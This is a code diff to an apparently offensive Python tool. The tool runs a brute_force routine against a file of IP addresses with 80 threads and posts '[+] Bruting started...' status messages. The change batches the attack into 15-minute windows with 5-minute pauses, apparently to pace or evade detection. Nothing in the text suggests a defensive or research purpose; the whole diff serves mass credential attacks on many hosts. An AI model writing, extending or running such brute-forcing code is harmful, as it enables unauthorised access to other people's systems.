@@ -123,13 +123,28 @@ def main():
         ips = trim_ip_file(last_ip)
     else:
         ips = open(IP_FILE).read().splitlines()
+    
     status_msg_id = send_new_message('[+] Bruting started...')
     total_ips = len(ips)
     Thread(target=periodic_update, daemon=True).start()
-    with ThreadPoolExecutor(max_workers=80) as executor:
-        futures = [executor.submit(brute_force, ip) for ip in ips]
-        for _ in as_completed(futures):
-            pass
+
+    ip_index = 0
+    while ip_index < len(ips):
+        start_time = time.time()
+        end_time = start_time + 15 * 60  # 15 minutes
+        while time.time() < end_time and ip_index < len(ips):
+            with ThreadPoolExecutor(max_workers=80) as executor:
+                futures = []
+                while time.time() < end_time and ip_index < len(ips):
+                    ip = ips[ip_index]
+                    ip_index += 1
+                    futures.append(executor.submit(brute_force, ip))
+                    if len(futures) >= 80:
+                        break
+                for _ in as_completed(futures):
+                    pass
+        print("[!] Sleeping for 5 minutes...")
+        time.sleep(5 * 60)  # 5 minutes
 
 if __name__ == '__main__':
     main()
